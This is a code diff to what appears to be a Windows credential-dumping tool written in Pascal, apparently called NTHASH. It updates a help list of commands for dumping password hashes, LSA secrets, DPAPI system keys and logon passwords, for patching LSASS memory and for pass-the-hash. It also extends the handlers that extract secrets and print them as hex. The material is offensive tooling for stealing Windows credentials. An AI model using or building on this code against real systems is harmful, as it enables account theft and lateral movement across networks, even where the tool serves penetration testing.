@@ -990,10 +990,12 @@ begin
   log('NTHASH /dumphash /rid:500 [/offline]',1); //will patch lsasss
   log('NTHASH /getsyskey [/offline]',1);
   log('NTHASH /getsamkey [/offline]',1);
-  log('NTHASH /getlsakeys',1);
-  log('NTHASH /wdigest',1);
-  log('NTHASH /logonpasswords',1);
-  log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1);
+  log('NTHASH /dumpsecret /input:secret [/offline]',1);
+  log('NTHASH /dumpsecret /input:dpapi_system [/offline]',1);
+  log('NTHASH /getlsakeys',1); //will read mem
+  log('NTHASH /wdigest',1);  //will read mem
+  log('NTHASH /logonpasswords',1); //will read mem
+  log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1); //will patch lsass
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1); //will patch lsass
   log('NTHASH /enumvault',1);
@@ -1012,7 +1014,7 @@ begin
   log('NTHASH /base64encode /input:string',1);
   log('NTHASH /base64decode /input:base64string',1);
   //****************************************************
-  log('NTHASH /dpapimk',1);
+  log('NTHASH /dpapimk',1);  //will read mem
   log('NTHASH /cryptunprotectdata /binary:filename',1);
   log('NTHASH /cryptunprotectdata /input:string',1);
   log('NTHASH /cryptprotectdata /input:string',1);
@@ -1022,7 +1024,8 @@ begin
   log('NTHASH /gethmac /mode:hashid /input:hexabytes /key:hexabytes',1);
   log('NTHASH /getcipher /mode:cipherid /input:hexabytes /key:hexabytes',1);
   log('NTHASH /getlsasecret /input:secret',1);
-  log('NTHASH /dpapi_system',1);
+  log('NTHASH /getlsasecret /input:dpapi_system',1);
+  //log('NTHASH /dpapi_system',1);
   //****************************************************
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
   log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
@@ -1599,13 +1602,19 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/dumpsecret',cmdline);
   if p>0 then
      begin
+     if input='' then exit;
      if getsyskey(syskey) then
-      if dumpsecret(syskey,output_) then
+      if dumpsecret(syskey,input,output_) then
        begin
-       log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
-       log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
-       log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
-       end;
+       if lowercase(input)='dpapi_system' then
+        begin
+        log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+        log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
+        log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
+        end
+        else log('secret:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+       end
+       else log('dumpsecret NOT OK, try adding /system' ,1);
      end;
   p:=pos('/getlsasecret',cmdline);
   if p>0 then
@@ -1613,7 +1622,16 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
      if input='' then exit;
      if lsasecret(input,output_)=false
         then log('lsasecrets failed',1)
-        else log(ByteToHexaString (output_),1);
+        else
+        begin
+        if lowercase(input)='dpapi_system' then
+         begin
+         log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+         log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
+         log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
+         end
+         else log('secret:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+        end;
      goto fin;
      end;
   p:=pos('/dpapi_system',cmdline);
